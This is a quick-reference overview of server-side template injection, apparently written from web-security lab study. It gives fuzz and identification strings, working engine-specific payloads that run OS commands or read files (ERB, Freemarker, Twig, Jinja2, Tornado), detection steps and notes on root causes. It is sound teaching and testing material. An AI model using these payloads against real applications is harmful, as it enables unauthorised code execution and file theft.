# SSTI (Server-side template injection) - topic overview & router

SSTI injects template syntax into user-controlled input that is rendered by the server-side template engine. If the engine evaluates the injection, you can execute arbitrary expressions - escalating from information disclosure to full RCE. Impact: read files, execute OS commands, delete files.

## 30-second quick reference

```
# Detection - inject polyglot fuzz string (triggers errors in most engines)
${{<%[%'"}}%\

# Identification by error or arithmetic evaluation
{{7*7}} -> 49 = Twig/Jinja2/Pebble
${7*7} -> 49 = Freemarker/Thymeleaf/ERB
<%= 7*7 %> -> 49 = ERB (Ruby)
#{7*7} -> 49 = Ruby string interpolation

# Confirm engine from error message then use engine-specific RCE:
# ERB (Ruby):        <%= `id` %>      <%= File.read('/home/carlos/secret') %>
# Freemarker (Java): <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Twig (PHP):        {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
# Handlebars (Node): {{#with "s" as |string|}}...constructor.call...{{/with}}
# Jinja2 (Python):   {{''.__class__.__mro__[1].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()}}
# Tornado (Python):  {%import os%}{{os.system('id')}}
```

## Decision map

| Symptom | Sub-technique | Action |
|---|---|---|
| `<%= 7*7 %>` -> 49 | [Basic-expression-injection](Basic-expression-injection/) | ERB: `<%= \`id\` %>` |
| `${7*7}` -> 49, Java error | [Template-engine-identification](Template-engine-identification/) | identify engine from docs |
| `{{7*7}}` -> 49, Twig/Jinja2 | [Template-engine-identification](Template-engine-identification/) | framework-specific chain |
| Fuzz string -> app error | [Template-engine-identification](Template-engine-identification/) | read error -> engine name |
| Twig sandboxed | [Sandbox-escape-and-advanced](Sandbox-escape-and-advanced/) | Java reflection chain |
| User object available | [Sandbox-escape-and-advanced](Sandbox-escape-and-advanced/) | method chaining via object |

## Sub-technique folders
- `Basic-expression-injection/` - ERB/Twig basic: arithmetic eval confirms SSTI, then RCE (2 labs)
- `Template-engine-identification/` - identify engine from docs/errors, engine-specific RCE (3 labs)
- `Sandbox-escape-and-advanced/` - Java sandbox bypass via reflection; custom exploit via object methods (2 labs)

## Root cause
User input is concatenated directly into a template string instead of passed as a template variable. `template.render("Hello " + user_input)` evaluates user_input as template syntax. Template variables (`template.render(name=user_input)`) are safe.

## Find it
1. Submit `${{<%[%'"}}%\` to any param that's reflected in the response - errors indicate SSTI.
2. Try `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` - if result is 49 -> SSTI confirmed.
3. Check: blog post descriptions, email templates, display name, notification messages.
4. Deliberately break the template: `${foobar}` -> error message names the engine.

## Chaining
- SSTI -> RCE -> [OS-command-injection](../OS-command-injection/) level impact (read files, execute commands)
- SSTI -> read source code -> further vulnerabilities
- SSTI via object methods -> arbitrary file deletion -> DoS

## Tools
- **Burp Repeater** - test template payloads
- **tplmap** - automated SSTI detection and exploitation tool

## References
- https://portswigger.net/web-security/server-side-template-injection
